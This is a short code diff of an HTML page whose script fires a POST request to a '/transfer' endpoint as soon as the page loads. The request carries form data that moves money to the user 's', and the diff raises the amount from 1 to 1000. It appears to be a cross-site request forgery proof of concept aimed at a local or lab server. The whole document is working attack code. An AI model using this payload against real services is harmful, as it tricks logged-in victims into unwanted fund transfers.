@@ -6,12 +6,12 @@
 <body>
     <script>
         // Trigger the POST request when the page loads
-        fetch("https://192.168.2.199:52011/transfer", {
+        fetch("https://127.0.0.1:8080/transfer", {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
             },
-            body: "user_to=s&amount=1"
+            body: "user_to=s&amount=1000"
         })
         .then(response => response.text())
         .then(data => {
